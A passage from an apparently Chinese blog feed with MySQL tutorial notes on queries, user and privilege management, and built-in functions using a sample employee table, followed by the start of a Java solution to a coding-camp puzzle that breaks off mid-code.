(14, &#x27;00014&#x27;, &#x27;灭绝&#x27;, &#x27;女&#x27;, 65, &#x27;123456719012345670&#x27;, &#x27;西安&#x27;, &#x27;2019-05-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (15, &#x27;00015&#x27;, &#x27;胡青牛&#x27;, &#x27;男&#x27;, 70, &#x27;12345674971234567X&#x27;, &#x27;西安&#x27;, &#x27;2018-04-</span><br><span class="line">01&#x27;);</span><br><span class="line">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class="line">VALUES (16, &#x27;00016&#x27;, &#x27;周芷若&#x27;, &#x27;女&#x27;, 18, null, &#x27;北京&#x27;, &#x27;2012-06-01&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">字段列表</span><br><span class="line">FROM</span><br><span class="line">表名列表</span><br><span class="line">WHERE</span><br><span class="line">条件列表</span><br><span class="line">GROUP BY</span><br><span class="line">分组字段列表</span><br><span class="line">HAVING</span><br><span class="line">分组后条件列表</span><br><span class="line">ORDER BY</span><br><span class="line">排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">分页参数</span><br></pre></td></tr></table></figure>

<p>基本查询（不带任何条件） 条件查询（WHERE） 聚合函数（count、max、min、avg、sum） 分组查询（group by） 排序查询（order by） 分页查询（limit）</p>
<h3 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h3><p>1). 查询多个字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段1, 字段2, 字段3 ... FROM 表名 ;</span><br><span class="line">SELECT * FROM 表名 ;</span><br></pre></td></tr></table></figure>

<p>2). 字段设置别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段1 [ AS 别名1 ] , 字段2 [ AS 别名2 ] ... FROM 表名;</span><br><span class="line">SELECT 字段1 [ 别名1 ] , 字段2 [ 别名2 ] ... FROM 表名;</span><br></pre></td></tr></table></figure>

<p>3). 去除重复记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT 字段列表 FROM 表名;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<p>A. 查询指定字段 name, workno, age并返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,workno,age from emp;</span><br></pre></td></tr></table></figure>

<p>B. 查询返回所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id ,workno,name,gender,age,idcard,workaddress,entrydate from emp;</span><br><span class="line">select * from emp;</span><br></pre></td></tr></table></figure>

<p>C. 查询所有员工的工作地址,起别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress as &#x27;工作地址&#x27; from emp;</span><br><span class="line">-- as可以省略</span><br><span class="line">select workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>

<p>D. 查询公司员工的上班地址有哪些(不要重复)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>

<h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 WHERE 条件列表 ;</span><br></pre></td></tr></table></figure>

<p>2). 条件</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230306090357474.png" alt="image-20230306090357474"></p>
<p>eg</p>
<p>A. 查询年龄等于 88 的员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age = 88;</span><br></pre></td></tr></table></figure>

<p>B. 查询年龄小于 20 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &lt; 20;</span><br></pre></td></tr></table></figure>

<p>C. 查询年龄小于等于 20 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &lt;= 20;</span><br></pre></td></tr></table></figure>

<p>D. 查询没有身份证号的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard is null;</span><br></pre></td></tr></table></figure>

<p>E.查询有身份证号的员工信</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard is not null;</span><br></pre></td></tr></table></figure>

<p>F:查询年龄不等于 88 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age != 88;</span><br><span class="line">select * from emp where age &lt;&gt; 88;</span><br></pre></td></tr></table></figure>

<p>G. 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age &gt;= 15 &amp;&amp; age &lt;= 20;</span><br><span class="line">select * from emp where age &gt;= 15 and age &lt;= 20;</span><br><span class="line">select * from emp where age between 15 and 20;</span><br></pre></td></tr></table></figure>

<p>H. 查询性别为 女 且年龄小于 25岁的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;女&#x27; and age &lt; 25;</span><br></pre></td></tr></table></figure>

<p>I. 查询年龄等于18 或 20 或 40 的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where age = 18 or age = 20 or age =40;</span><br><span class="line">select * from emp where age in(18,20,40);</span><br></pre></td></tr></table></figure>

<p>J. 查询姓名为两个字的员工信息 _ %</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where name like &#x27;__&#x27;;</span><br></pre></td></tr></table></figure>

<p>k. 查询身份证号最后一位是X的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where idcard like &#x27;%X&#x27;;</span><br><span class="line">select * from emp where idcard like &#x27;_________________X&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>1). 介绍 将一列数据作为一个整体，进行纵向计算 。</p>
<p>2). 常见的聚合函数</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">count</td>
<td align="center">统计数量</td>
</tr>
<tr>
<td align="center">max</td>
<td align="center">最大值</td>
</tr>
<tr>
<td align="center">min</td>
<td align="center">最小值</td>
</tr>
<tr>
<td align="center">avg</td>
<td align="center">平均值</td>
</tr>
<tr>
<td align="center">sum</td>
<td align="center">求和</td>
</tr>
</tbody></table>
<p>A. 统计该企业员工数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from emp; -- 统计的是总记录数</span><br><span class="line">select count(idcard) from emp; -- 统计的是idcard字段不为null的记录数</span><br></pre></td></tr></table></figure>

<p>B. 统计该企业员工的平均年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select avg(age) from emp;</span><br></pre></td></tr></table></figure>

<p>C. 统计该企业员工的最大年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select max(age) from emp;</span><br></pre></td></tr></table></figure>

<p>D. 统计该企业员工的最小年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select min(age) from emp;</span><br></pre></td></tr></table></figure>

<p>E. 统计西安地区员工的年龄之和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sum(age) from emp where workaddress = &#x27;西安&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组</span><br><span class="line">后过滤条件 ];</span><br></pre></td></tr></table></figure>

<p>2). where与having区别</p>
<p>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组 之后对结果进行过滤。 </p>
<p>判断条件不同：where不能对聚合函数进行判断，而having可以。</p>
<p>A. 根据性别分组 , 统计男性员工 和 女性员工的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from emp group by gender ;</span><br></pre></td></tr></table></figure>

<p>B. 根据性别分组 , 统计男性员工 和 女性员工的平均年龄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, avg(age) from emp group by gender ;</span><br></pre></td></tr></table></figure>

<p>C. 查询年龄小于45的员工 , 并根据工作地址分组 , 获取员工数量大于等于3的工作地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress, count(*) address_count from emp where age &lt; 45 group by</span><br><span class="line">workaddress having address_count &gt;= 3;</span><br></pre></td></tr></table></figure>

<p>D. 统计各个工作地址上班的男性及女性员工的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select workaddress, gender, count(*) &#x27;数量&#x27; from emp group by gender , workaddress</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h3 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1 , 字段2 排序方式2 ;</span><br></pre></td></tr></table></figure>

<p>2). 排序方式</p>
<p>ASC : 升序(默认值) DESC: 降序</p>
<p>注意事项：</p>
<p> •如果是升序, 可以不指定排序方式ASC ; </p>
<p>• 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序 ;</p>
<p>A. 根据年龄对公司的员工进行升序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by age asc;</span><br><span class="line">select * from emp order by age;</span><br></pre></td></tr></table></figure>

<p>B. 根据入职时间, 对员工进行降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by entrydate desc;</span><br></pre></td></tr></table></figure>

<p>C. 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>

<h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p>1). 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数 ;</span><br></pre></td></tr></table></figure>

<p>A. 查询第1页员工数据, 每页展示10条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 0,10;</span><br><span class="line">select * from emp limit 10;</span><br></pre></td></tr></table></figure>

<p>B. 查询第2页员工数据, 每页展示10条记录 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 10,10;</span><br></pre></td></tr></table></figure>

<h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p>1). 查询年龄为20,21,22,23岁的女员工信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;女&#x27; and age in(20,21,22,23);</span><br></pre></td></tr></table></figure>

<p>2). 查询性别为 男 ，并且年龄在 20-40 岁(含)以内的姓名为三个字的员工。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;男&#x27; and ( age between 20 and 40 ) and name like</span><br><span class="line">&#x27;___&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 统计员工表中, 年龄小于60岁的 , 男性员工和女性员工的人数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from emp where age &lt; 60 group by gender;</span><br></pre></td></tr></table></figure>

<p>4). 查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按 入职时间降序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name , age from emp where age &lt;= 35 order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>

<p>5). 查询性别为男，且年龄在20-40 岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序， 年龄相同按入职时间升序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;男&#x27; and age between 20 and 40 order by age asc ,</span><br><span class="line">entrydate asc limit 5 ;</span><br></pre></td></tr></table></figure>

<h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>DQL执行顺序</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309085943559.png" alt="image-20230309085943559"></p>
<p>验证：</p>
<p>查询年龄大于15的员工姓名、年龄，并根据年龄进行升序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name , age from emp where age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>在查询时，我们给emp表起一个别名 e，然后在select 及 where中使用该别名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name , e.age from emp e where e.age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>可以正常的查询到结果,此时就说明： from 先执行, 然后 where 和 select 执行。</p>
<p>那 where 和 select 到底哪个先执行呢? </p>
<p>此时，此时我们可以给select后面的字段起别名，然后在 where 中使用这个别名，然后看看是否可 以执行成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name ename , e.age eage from emp e where eage &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>SQL报错了,可以得出结论: from 先执行，然后执行 where ， 再执行select 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name ename , e.age eage from emp e where e.age &gt; 15 order by eage asc;</span><br></pre></td></tr></table></figure>

<p>成功,就验证了: order by 是在select 语句之后执行的。</p>
<p><strong>综上所述，我们可以看到DQL语句的执行顺序为： from … where … group by … having … select … order by … limit …</strong></p>
<h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p>DCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访 问权限。</p>
<h3 id="管理用户"><a href="#管理用户" class="headerlink" title="管理用户"></a>管理用户</h3><p>1). 查询用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.user;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309090928741.png" alt="image-20230309090928741"></p>
<p>其中 Host代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以 远程访问的。 User代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一 个用户。</p>
<p>2). 创建用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED BY &#x27;密码&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 修改用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27; ;</span><br></pre></td></tr></table></figure>

<p>4). 删除用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP USER &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项:</span><br><span class="line">• 在MySQL中需要通过用户名@主机名的方式，来唯一标识一个用户。</span><br><span class="line">• 主机名可以使用 % 通配。</span><br><span class="line">• 这类SQL开发人员操作的比较少，主要是DBA（ Database Administrator 数据库管理员）使用。</span><br></pre></td></tr></table></figure>

<p>案例：</p>
<p>A. 创建用户itcast, 只能够在当前主机localhost访问, 密码123456;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user &#x27;itcast&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>B. 创建用户heima, 可以在任意主机访问该数据库, 密码123456;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user &#x27;heima&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>C. 修改用户heima的访问密码为1234;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;heima&#x27;@&#x27;%&#x27; identified with mysql_native_password by &#x27;1234&#x27;;</span><br></pre></td></tr></table></figure>

<p>D. 删除 itcast@localhost 用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop user &#x27;itcast&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><p>MySQL中定义了很多种权限,<a href="https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html">MySQL :: MySQL 8.0 Reference Manual :: 6.2.2 Privileges Provided by MySQL</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309092308658.png" alt="image-20230309092308658"></p>
<p>1). 查询权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>

<p>2). 授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT 权限列表 ON 数据库名.表名 TO &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 撤销权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REVOKE 权限列表 ON 数据库名.表名 FROM &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项：</span><br><span class="line">• 多个权限之间，使用逗号分隔</span><br><span class="line">• 授权时， 数据库名和表名可以使用 * 进行通配，代表所有。</span><br></pre></td></tr></table></figure>

<p>案例:</p>
<p>A. 查询 ‘heima‘@’%’ 用户的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show grants for &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<p>B. 授予 ‘heima‘@’%’ 用户itcast数据库所有表的所有操作权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on itcast.* to &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<p>C. 撤销 ‘heima‘@’%’ 用户的itcast数据库的所有权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke all on itcast.* from &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>函数 是指一段可以直接被另一段程序调用的程序或代码。</p>
<p>问题：</p>
<p>1). 在企业的OA或其他的人力系统中，经常会提供的有这样一个功能，每一个员工登录上来之后都能 够看到当前员工入职的天数。 而在数据库中，存储的都是入职日期，如 2000-11-12，那如果快速计 算出天数呢？</p>
<p> 2). 在做报表这类的业务需求中,我们要展示出学员的分数等级分布。而在数据库中，存储的是学生的 分数值，如98&#x2F;75，如何快速判定分数的等级呢？ </p>
<p>其实，上述的这一类的需求呢，我们通过MySQL中的函数都可以很方便的实现 。 MySQL中的函数主要分为以下四类： 字符串函数、数值函数、日期函数、流程函数。</p>
<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CONCAT(S1,S2,…Sn)</td>
<td align="center">字符串拼接，将S1，S2，… Sn拼接成一个字符串</td>
</tr>
<tr>
<td align="center">LOWER(str)</td>
<td align="center">将字符串str全部转为小写</td>
</tr>
<tr>
<td align="center">UPPER(str)</td>
<td align="center">将字符串str全部转为大写</td>
</tr>
<tr>
<td align="center">LPAD(str,n,pad)</td>
<td align="center">左填充，用字符串pad对str的左边进行填充，达到n个字符 串长度</td>
</tr>
<tr>
<td align="center">RPAD(str,n,pad)</td>
<td align="center">右填充，用字符串pad对str的右边进行填充，达到n个字符 串长度</td>
</tr>
<tr>
<td align="center">TRIM(str)</td>
<td align="center">去掉字符串头部和尾部的空格</td>
</tr>
<tr>
<td align="center">SUBSTRING(str,start,len)</td>
<td align="center">返回从字符串str从start位置起的len个长度的字符串</td>
</tr>
</tbody></table>
<p>由于业务需求变更，企业员工的工号，统一为5位数，目前不足5位数的全部在前面补0。比如： 1号员 工的工号应该为00001。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update emp set workno = lpad(workno, 5, &#x27;0&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h3><p>常见的数值函数如下：</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CEIL(x)</td>
<td align="center">向上取整</td>
</tr>
<tr>
<td align="center">向上取整</td>
<td align="center">向下取整</td>
</tr>
<tr>
<td align="center">MOD(x,y)</td>
<td align="center">返回x&#x2F;y的模</td>
</tr>
<tr>
<td align="center">RAND()</td>
<td align="center">返回0~1内的随机数</td>
</tr>
<tr>
<td align="center">ROUND(x,y)</td>
<td align="center">求参数x的四舍五入的值，保留y位小数</td>
</tr>
</tbody></table>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 数值函数</span><br><span class="line">-- ceil</span><br><span class="line">select ceil(1.1);</span><br><span class="line"></span><br><span class="line">-- floor</span><br><span class="line">select floor(1.9);</span><br><span class="line"></span><br><span class="line">-- mod</span><br><span class="line">select mod(7,4);</span><br><span class="line"></span><br><span class="line">-- rand</span><br><span class="line">select rand();</span><br><span class="line"></span><br><span class="line">-- round</span><br><span class="line">select round(2.344,2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 案例: 通过数据库的函数，生成一个六位数的随机验证码。</span><br><span class="line">select lpad(round(rand()*1000000 , 0), 6, &#x27;0&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><p>常见的日期函数如下：</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CURDATE()</td>
<td align="center">返回当前日期</td>
</tr>
<tr>
<td align="center">CURTIME()</td>
<td align="center">返回当前时间</td>
</tr>
<tr>
<td align="center">NOW()</td>
<td align="center">返回当前日期和时间</td>
</tr>
<tr>
<td align="center">YEAR(date)</td>
<td align="center">获取指定date的年份</td>
</tr>
<tr>
<td align="center">MONTH(date)</td>
<td align="center">获取指定date的月份</td>
</tr>
<tr>
<td align="center">DAY(date)</td>
<td align="center">获取指定date的日期</td>
</tr>
<tr>
<td align="center">DATE_ADD(date, INTERVAL expr type)</td>
<td align="center">返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</td>
</tr>
<tr>
<td align="center">DATEDIFF(date1,date2)</td>
<td align="center">返回起始时间date1 和 结束时间date2之间的天数</td>
</tr>
</tbody></table>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 案例: 查询所有员工的入职天数，并根据入职天数倒序排序。</span><br><span class="line">select name, datediff(curdate(), entrydate) as &#x27;entrydays&#x27; from emp order by entrydays desc;</span><br></pre></td></tr></table></figure>

<h3 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">IF(value, t, f)</td>
<td align="center">如果value为true，则返回t，否则返回f</td>
</tr>
<tr>
<td align="center">IFNULL(value1, value2)</td>
<td align="center">如果value1不为空，返回value1，否则返回value2</td>
</tr>
<tr>
<td align="center">CASE WHEN [val1] THEN [res1] … ELSE [default] END</td>
<td align="center">如果val1为true，返回res1，… 否则返回default默认值</td>
</tr>
<tr>
<td align="center">CASE [expr] WHEN [val1] THEN [res1] … ELSE [default] END</td>
<td align="center">如果expr的值等于val1，返回res1，… 否则返回default默认值</td>
</tr>
</tbody></table>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 流程控制函数</span><br><span class="line">-- if</span><br><span class="line">select if(false, &#x27;Ok&#x27;, &#x27;Error&#x27;);</span><br><span class="line"></span><br><span class="line">-- ifnull</span><br><span class="line">select ifnull(&#x27;Ok&#x27;,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">select ifnull(&#x27;&#x27;,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">select ifnull(null,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">-- case when then else end</span><br><span class="line">-- 需求: 查询emp表的员工姓名和工作地址 (北京/上海 ----&gt; 一线城市 , 其他 ----&gt; 二线城市)</span><br><span class="line">select</span><br><span class="line">    name,</span><br><span class="line">    ( case workaddress when &#x27;北京&#x27; then &#x27;一线城市&#x27; when &#x27;上海&#x27; then &#x27;一线城市&#x27; else &#x27;二线城市&#x27; end ) as &#x27;工作地址&#x27;</span><br><span class="line">from emp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 案例: 统计班级各个学员的成绩，展示的规则如下：</span><br><span class="line">-- &gt;= 85，展示优秀</span><br><span class="line">-- &gt;= 60，展示及格</span><br><span class="line">-- 否则，展示不及格</span><br><span class="line"></span><br><span class="line">create table score(</span><br><span class="line">    id int comment &#x27;ID&#x27;,</span><br><span class="line">    name varchar(20) comment &#x27;姓名&#x27;,</span><br><span class="line">    math int comment &#x27;数学&#x27;,</span><br><span class="line">    english int comment &#x27;英语&#x27;,</span><br><span class="line">    chinese int comment &#x27;语文&#x27;</span><br><span class="line">) comment &#x27;学员成绩表&#x27;;</span><br><span class="line">insert into score(id, name, math, english, chinese) VALUES (1, &#x27;Tom&#x27;, 67, 88, 95 ), (2, &#x27;Rose&#x27; , 23, 66, 90),(3, &#x27;Jack&#x27;, 56, 98, 76);</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">select</span><br><span class="line">    id,</span><br><span class="line">    name,</span><br><span class="line">    (case when math &gt;= 85 then &#x27;优秀&#x27; when math &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;数学&#x27;,</span><br><span class="line">    (case when english &gt;= 85 then &#x27;优秀&#x27; when english &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;英语&#x27;,</span><br><span class="line">    (case when chinese &gt;= 85 then &#x27;优秀&#x27; when chinese &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;语文&#x27;</span><br><span class="line">from score;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>project_字节青训营</title>
    <url>/2024/11/20/project-%E5%AD%97%E8%8A%82%E9%9D%92%E8%AE%AD%E8%90%A5/</url>
    <content><![CDATA[<p>青训营学习，学下go</p>
<p>[toc]</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static int solution(int n, int k, int[] data) &#123;</span><br><span class="line">    Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();</span><br><span class="line">    int totCost = 0;</span><br><span class="line">    int currentFood = 0;</span><br><span class="line">    int totFood = 0;</span><br><span class="line">    for (int i = 0; i &lt; n; i++) &#123;</span><br><span class="line">        //如果当前没有事物，必须至少买一份</span><br><span class="line">        if(currentFood == 0)&#123;</span><br><span class="line">            totCost += data[i];</span><br><span class="line">            totFood++;</span><br><span class="line">            currentFood++;</span><br><span class="line">        &#125;</span><br><span class="line">        boolean flag = false;</span><br><span class="line">        int nextLowIndex = -1;</span><br><span class="line">        for (int j = i + 1; (j &lt;= (i + currentFood - 1)) &amp;&amp; j &lt; n; j++)&#123;</span><br><span class="line">            if(data[i] &gt;= data[j])&#123;</span><br><span class="line">                flag = true;</span><br><span class="line">                nextLowIndex = j;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //如果没找到，直接买到上线</span><br><span class="line">        if(!flag)&#123;</span><br><span class="line">            int buyCount = Integer.min(n - totFood, k - currentFood);</span><br><span class="line">            totCost += buyCount * data[i];</span><br><span class="line">            currentFood += buyCount;</span><br><span class="line">            totFood += buyCount;</span><br><span class="line">        &#125; else&#123;</span><br><span class="line">            int dis = nextLowIndex - i;</span><br><span class="line">            int buyCount = Integer.min(dis - currentFood, n - totFood);</span><br><span class="line">            buyCount = Integer.max(0, buyCount);</span><br><span class="line">            totCost += buyCount * data[i];</span><br><span class="line">            currentFood += buyCount;</span><br><span class="line">            totFood += buyCount;</span><br><span class="line">        &#125;</span><br><span class="line">        currentFood--;</span><br><span class="line">        